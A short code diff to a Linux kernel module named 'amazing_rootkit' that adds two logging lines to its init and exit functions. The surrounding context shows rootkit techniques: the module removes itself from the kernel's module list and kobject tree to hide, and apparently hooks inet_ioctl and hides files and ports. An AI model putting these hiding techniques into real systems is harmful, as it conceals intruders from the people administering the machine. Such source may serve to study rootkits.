@@ -413,6 +413,8 @@ static long inet_ioctl_hook ( struct socket *sock, unsigned int cmd, unsigned lo
 
 static int __init amazing_rootkit_init(void)
 {
+    pr_info("%s: amazing_rootkit_init\n", MODULE_NAME);
+
     // Do kernel module hiding
     list_del_init(&__this_module.list);
     kobject_del(&THIS_MODULE->mkobj.kobj);
@@ -439,6 +441,8 @@ static void __exit amazing_rootkit_exit(void)
 
     hidden_filename_cleanup();
     hidden_port_cleanup();
+
+    pr_info("%s: amazing_rootkit exit & cleanup\n", MODULE_NAME);
 }
 
 module_init(amazing_rootkit_init);
